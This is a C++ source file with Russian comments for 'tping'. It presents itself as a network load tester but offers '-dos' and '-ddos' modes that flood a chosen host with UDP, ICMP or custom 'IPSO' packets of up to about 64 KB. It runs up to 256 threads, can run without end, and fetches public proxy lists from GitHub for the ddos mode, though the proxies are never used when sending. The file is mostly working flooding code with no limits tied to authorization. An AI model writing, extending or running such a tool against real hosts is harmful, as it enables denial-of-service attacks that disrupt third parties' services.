// ============================================================================
// tping.cpp – сетевой нагрузочный тестер (UDP / IPSO / ICMP)
// Режимы: -dos (по умолчанию) | -ddos (через прокси)
// ============================================================================

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>
#include <atomic>
#include <mutex>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <cmath>
#include <cstdint>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>
#include <sys/capability.h>

using namespace std;
using namespace chrono;

atomic<bool> running(true);
atomic<unsigned long long> sent_bytes(0);
atomic<unsigned long long> sent_packets(0);
atomic<unsigned long long> recv_packets(0);
mutex proxies_mutex;
vector<string> proxies;
bool ddos_mode = false;

void sigint_handler(int) { running = false; }

// ==================== IPSO ====================
#pragma pack(push, 1)
struct IpsoHeader {
    char magic[4];
    uint32_t seq;
    uint32_t frag_id;
    uint64_t total_size;
    uint64_t timestamp;
    uint16_t payload_len;
};
#pragma pack(pop)

const char IPSO_MAGIC[4] = {'I', 'P', 'S', 'O'};
const size_t IPSO_HEADER_SIZE = sizeof(IpsoHeader);

// ==================== УТИЛИТЫ ====================
unsigned long long parse_size(const string& s) {
    if (s.empty()) return 0;
    size_t pos = 0;
    unsigned long long value = 0;
    while (pos < s.size() && isdigit(s[pos])) { value = value * 10 + (s[pos] - '0'); pos++; }
    string unit = s.substr(pos);
    for (auto& c : unit) c = tolower(c);
    if (unit == "b" || unit.empty()) return value;
    if (unit == "kb") return value * 1024ULL;
    if (unit == "mb") return value * 1024ULL * 1024ULL;
    if (unit == "gb") return value * 1024ULL * 1024ULL * 1024ULL;
    if (unit == "t") return value * 1024ULL * 1024ULL * 1024ULL * 1024ULL;
    return value;
}

string resolve(const string& host) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0) return "";
    struct sockaddr_in* addr = (struct sockaddr_in*)res->ai_addr;
    string ip = inet_ntoa(addr->sin_addr);
    freeaddrinfo(res);
    return ip;
}

uint64_t now_us() {
    return duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
}

// ==================== ПРОКСИ ====================
vector<string> load_proxies_from_file(const string& filename) {
    vector<string> result;
    ifstream f(filename);
    if (!f.is_open()) return result;
    string line;
    while (getline(f, line)) {
        if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
    }
    return result;
}

vector<string> load_proxies_from_github() {
    vector<string> result;
    vector<string> urls = {
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
    };
    for (const auto& url : urls) {
        string cmd = "curl -s --max-time 10 \"" + url + "\" 2>/dev/null";
        FILE* fp = popen(cmd.c_str(), "r");
        if (!fp) continue;
        char buf[512];
        while (fgets(buf, sizeof(buf), fp)) {
            string line = buf;
            while (!line.empty() && (line.back() == '\n' || line.back() == '\r' || line.back() == ' '))
                line.pop_back();
            if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
        }
        pclose(fp);
    }
    return result;
}

void load_proxies_smart() {
    proxies = load_proxies_from_file("proxies.txt");
    if (proxies.empty()) proxies = load_proxies_from_file("/usr/local/bin/proxies.txt");
    if (proxies.empty()) proxies = load_proxies_from_file("./proxies.txt");
    if (proxies.empty()) {
        cerr << "[*] proxies.txt не найден, загружаю с GitHub...\n";
        proxies = load_proxies_from_github();
    }
    if (proxies.empty()) {
        cerr << "[-] Прокси не загружены. Режим -ddos отключён, работаю как -dos.\n";
        ddos_mode = false;
    } else {
        cout << "[+] Загружено прокси: " << proxies.size() << "\n";
    }
}

string get_random_proxy() {
    lock_guard<mutex> lock(proxies_mutex);
    if (proxies.empty()) return "";
    return proxies[rand() % proxies.size()];
}

// ==================== ТАБЛИЦА ====================
void show_table() {
    cout << "====== ТАБЛИЦА ЕДИНИЦ ======\n";
    cout << "b, kb, mb, gb, t\n\n";
    cout << "====== МАКСИМАЛЬНЫЙ РАЗМЕР ПАКЕТА ======\n";
    cout << "IP лимит:                  65535 b\n";
    cout << "UDP:                       65507 b\n";
    cout << "ICMP:                      65479 b\n";
    cout << "IPSO payload (UDP+загол.): 65478 b\n";
    cout << "Ethernet MTU:              1500 b\n";
    cout << "Jumbo:                     9000 b\n";
}

// ==================== СПРАВКА ====================
void show_help() {
    cout << "tping – сетевой нагрузочный тестер\n";
    cout << "Использование: tping [-dos|-ddos] [-ipso] [-icmp] [-l] [-t N] [-d SEC] [-c N] [-p PORT] [-table] -url <цель> [<размер><единица>]\n";
    cout << "Режимы:\n";
    cout << "  -dos          отправка с локального IP (по умолчанию)\n";
    cout << "  -ddos         распределённая отправка (proxies.txt или автозагрузка)\n";
    cout << "Другие флаги:\n";
    cout << "  -ipso         формат IPSO поверх UDP\n";
    cout << "  -icmp         ICMP-режим (нужен root)\n";
    cout << "  -l            бесконечная отправка\n";
    cout << "  -t <N>        число потоков (1..256)\n";
    cout << "  -d <SEC>      длительность в секундах\n";
    cout << "  -c <N>        пакетов на поток\n";
    cout << "  -p <PORT>     порт (по умолчанию 80)\n";
    cout << "  -table        таблица размеров\n";
    cout << "Единицы размера: b, kb, mb, gb, t\n";
}

// ==================== WORKER ====================
void worker(const string& target_ip, int port, unsigned long long payload_size,
            unsigned long long max_packets, int worker_id,
            bool ipso_mode, bool icmp_mode,
            steady_clock::time_point global_start, int duration_sec) {
    int proto = icmp_mode ? IPPROTO_ICMP : IPPROTO_UDP;
    int sock_type = icmp_mode ? SOCK_RAW : SOCK_DGRAM;
    int sock = socket(AF_INET, sock_type, proto);
    if (sock < 0) return;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target_ip.c_str(), &dest.sin_addr);

    const unsigned long long MAX_UDP = 65507;
    unsigned long long total_packet_size;
    if (icmp_mode) {
        if (payload_size > 65479) payload_size = 65479;
        total_packet_size = payload_size;
    } else if (ipso_mode) {
        if (payload_size + IPSO_HEADER_SIZE > MAX_UDP) payload_size = MAX_UDP - IPSO_HEADER_SIZE;
        total_packet_size = payload_size + IPSO_HEADER_SIZE;
    } else {
        if (payload_size > MAX_UDP) payload_size = MAX_UDP;
        total_packet_size = payload_size;
    }
    if (total_packet_size == 0) total_packet_size = 1;

    vector<char> packet(total_packet_size, 'A');
    IpsoHeader* ipso = nullptr;
    if (ipso_mode && !icmp_mode) {
        ipso = (IpsoHeader*)packet.data();
        memcpy(ipso->magic, IPSO_MAGIC, 4);
        ipso->frag_id = worker_id;
        ipso->total_size = payload_size;
    }
    struct icmp* icmp_hdr = nullptr;
    if (icmp_mode && total_packet_size >= sizeof(struct icmp)) {
        icmp_hdr = (struct icmp*)packet.data();
        icmp_hdr->icmp_type = ICMP_ECHO;
        icmp_hdr->icmp_code = 0;
        icmp_hdr->icmp_id = getpid() + worker_id;
    }

    unsigned long long sent_count = 0;
    uint32_t seq = 0;

    while (running) {
        if (duration_sec > 0) {
            auto now = steady_clock::now();
            if (duration_cast<seconds>(now - global_start).count() >= duration_sec) break;
        }
        if (max_packets > 0 && sent_count >= max_packets) break;

        seq++;
        sent_count++;

        if (ipso && !icmp_mode) {
            ipso->seq = seq;
            ipso->timestamp = now_us();
            ipso->payload_len = (uint16_t)payload_size;
        }
        if (icmp_hdr) {
            icmp_hdr->icmp_seq = seq;
            icmp_hdr->icmp_cksum = 0;
            unsigned short* buf = (unsigned short*)packet.data();
            unsigned int sum = 0;
            int len = total_packet_size;
            for (sum = 0; len > 1; len -= 2) sum += *buf++;
            if (len == 1) sum += *(unsigned char*)buf;
            sum = (sum >> 16) + (sum & 0xFFFF);
            sum += (sum >> 16);
            icmp_hdr->icmp_cksum = ~sum;
        }

        int sent = sendto(sock, packet.data(), packet.size(), 0,
                          (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) { sent_bytes += sent; sent_packets++; }
    }
    close(sock);
}

// ==================== ЗАПУСК ====================
void tping_run(const string& host, const string& target_ip, int port,
               unsigned long long payload_size, bool infinite,
               unsigned long long max_packets, int threads_count,
               int duration_sec, bool ipso_mode, bool icmp_mode) {
    auto start_time = steady_clock::now();

    cout << "\n" << (icmp_mode ? "ICMP" : (ipso_mode ? "IPSO" : "UDP"))
         << " " << host << " (" << target_ip << ") port " << port
         << " payload " << payload_size << " bytes";
    if (ddos_mode) cout << " [ddos via proxies: " << proxies.size() << "]";
    else cout << " [dos]";
    if (infinite) cout << " [infinite]";
    if (threads_count > 1) cout << " [threads: " << threads_count << "]";
    if (duration_sec > 0) cout << " [duration: " << duration_sec << "s]";
    cout << "\n";

    atomic<bool> stats_running(true);
    thread stats_thread([&]() {
        auto last_time = steady_clock::now();
        unsigned long long last_bytes = 0;
        while (stats_running && running) {
            this_thread::sleep_for(seconds(1));
            auto now = steady_clock::now();
            double dt = duration_cast<milliseconds>(now - last_time).count() / 1000.0;
            if (dt <= 0) continue;
            unsigned long long total_b = sent_bytes.load();
            unsigned long long delta = total_b - last_bytes;
            double mbps = (delta / dt) / (1024.0 * 1024.0);
            double elapsed_s = duration_cast<milliseconds>(now - start_time).count() / 1000.0;
            double pps = elapsed_s > 0 ? sent_packets.load() / elapsed_s : 0;
            unsigned long long s = sent_packets.load();
            unsigned long long r = recv_packets.load();
            double loss = s > 0 ? (100.0 * (s - r) / s) : 0;

            cout << "\r[+] Sent: " << total_b << " bytes (" << s << " pkts)"
                 << " | recv: " << r
                 << " | loss: " << fixed << setprecision(2) << loss << "%"
                 << " | " << mbps << " MB/s"
                 << " | " << setprecision(0) << pps << " pps     " << flush;
            last_time = now; last_bytes = total_b;
        }
    });

    vector<thread> workers;
    for (int i = 0; i < threads_count; ++i) {
        workers.emplace_back(worker, target_ip, port, payload_size, max_packets,
                             i, ipso_mode, icmp_mode, start_time, duration_sec);
    }
    for (auto& t : workers) t.join();

    running = false;
    stats_running = false;
    if (stats_thread.joinable()) stats_thread.join();

    auto end_time = steady_clock::now();
    double elapsed = duration_cast<milliseconds>(end_time - start_time).count() / 1000.0;
    unsigned long long s = sent_packets.load();
    unsigned long long r = recv_packets.load();
    double loss = s > 0 ? (100.0 * (s - r) / s) : 0;

    cout << "\n\n--- " << host << " " << (icmp_mode ? "icmp" : (ipso_mode ? "ipso" : "udp")) << " statistics ---\n";
    cout << s << " packets transmitted, " << r << " received, "
         << fixed << setprecision(2) << loss << "% packet loss\n";
    cout << "Total sent: " << sent_bytes << " bytes (" << s << " packets)\n";
    double speed = elapsed > 0 ? (sent_bytes / elapsed) / (1024.0 * 1024.0) : 0;
    cout << "Avg speed: " << fixed << setprecision(2) << speed << " MB/s\n";
}

// ==================== MAIN ====================
int main(int argc, char* argv[]) {
    signal(SIGINT, sigint_handler);
    srand(time(nullptr));

    if (argc < 2) { show_help(); return 0; }
    string first = argv[1];
    if (first == "-help" || first == "--help" || first == "-h") { show_help(); return 0; }
    if (first == "-table" || first == "--table") { show_table(); return 0; }

    string url;
    unsigned long long payload_size = 56;
    unsigned long long max_packets = 1;
    int threads_count = 1;
    int duration_sec = 0;
    int port = 80;
    bool infinite = false;
    bool ipso_mode = false;
    bool icmp_mode = false;

    for (int i = 1; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "-dos") ddos_mode = false;
        else if (arg == "-ddos") ddos_mode = true;
        else if (arg == "-l") infinite = true;
        else if (arg == "-ipso") ipso_mode = true;
        else if (arg == "-icmp") icmp_mode = true;
        else if (arg == "-url" && i + 1 < argc) url = argv[++i];
        else if (arg == "-c" && i + 1 < argc) max_packets = stoull(argv[++i]);
        else if (arg == "-t" && i + 1 < argc) {
            threads_count = stoi(argv[++i]);
            if (threads_count < 1) threads_count = 1;
            if (threads_count > 256) threads_count = 256;
        }
        else if (arg == "-d" && i + 1 < argc) duration_sec = stoi(argv[++i]);
        else if (arg == "-p" && i + 1 < argc) port = stoi(argv[++i]);
        else {
            unsigned long long parsed = parse_size(arg);
            if (parsed > 0) payload_size = parsed;
        }
    }

    if (ddos_mode) load_proxies_smart();
    if (url.empty()) { show_help(); return 1; }
    if (infinite || duration_sec > 0) max_packets = 0;

    string ip = resolve(url);
    if (ip.empty()) { cerr << "[-] Ошибка: не удалось разрешить " << url << "\n"; return 1; }

    if (icmp_mode) {
        cap_t caps = cap_get_proc();
        bool has_cap = false;
        if (caps) {
            cap_flag_value_t v;
            cap_get_flag(caps, CAP_NET_RAW, CAP_EFFECTIVE, &v);
            has_cap = (v == CAP_SET);
            cap_free(caps);
        }
        if (!has_cap && geteuid() != 0) {
            cerr << "[-] ICMP требует root или capability cap_net_raw\n";
            return 1;
        }
    }

    tping_run(url, ip, port, payload_size, infinite, max_packets,
              threads_count, duration_sec, ipso_mode, icmp_mode);
    return 0;
}